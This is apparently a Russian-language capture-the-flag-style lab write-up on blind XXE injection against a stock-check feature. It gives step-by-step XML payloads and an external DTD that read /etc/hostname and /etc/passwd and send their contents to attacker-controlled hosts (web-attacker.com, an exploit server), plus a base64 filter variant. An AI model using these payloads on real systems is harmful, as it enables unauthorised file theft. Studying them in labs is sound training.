В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Чтобы решить лабораторную работу, извлеките содержимое файла `/etc/hostname`.

## Дано

уязвимость  функция «Проверка запасов»
не отображает результат инъекция

## Задача

извлеките содержимое файла `/etc/hostname`.

# Решение

Запрос
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

тест dtd
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY xxe test "test> 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- "XML parsing error"

проверим пинг 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY % xxe SYSTEM "https://5hnuzib2b14c93c2jujnrgghn8t0hr8fx.oastify.com"> 
	%xxe;
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- есть

теперь формируем двойную сущность
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY % file SYSTEM "file:///etc/passwd"> 
	<!ENTITY % eval "<!ENTITY &#x25; exfile SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfile;
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
- ответ "Entities are not allowed for security reasons"

делаем нагрузку полезную которая обратится к нашему серверу с dtd
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
  <!ENTITY % loadDTD SYSTEM "https://exploit-0ad20044048e5e3480fa52cd017900d7.exploit-server.net/exploit"> 
  %loadDTD;
  %eval;
  %exfile;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

на сервере 
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfile SYSTEM 'https://exploit-0ad20044048e5e3480fa52cd017900d7.exploit-server.net/exploit/%file;'>">
```
- Можно было и на сервере вызвать сущности
#### Внимание
при выводе многострочных файлов где могут храниться спец символы лучше использовать ftp и/или кодировку base64 
![[Pasted image 20250201123155.png]]
Пример
`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">`
#### Объяснение
1. Мы отправляем парсеру внешнюю сущность которая отправляет его на наш сервер где хранятся 2 сущности 
2. Сущность на сервере `file` определяет файл который нам нужно заполучить, вторя сущность `eval` определяет сущность `exfile` которая ссылается на наш сервер по пути который на самом деле хранит в себе информацию с сервера жертвы 

- Мы сделали **цепочку параметрических сущностей**. Это нужно для:
	1. **Обхода ограничений парсера**:  
	    Некоторые парсеры запрещают объявлять внешние сущности внутри внутреннего DTD. Параметрические сущности позволяют обойти это ограничение.
	2. **Динамической подстановки данных**:  
	    Сначала определяется `%file` (файл), затем `%eval` использует `%file` для формирования URL. Без цепочки подстановка данных была бы невозможна.
	3. **Автоматической активации**:  
	    Параметрические сущности (`%eval;`, `%exfilе;`) выполняются сразу после объявления в DTD.
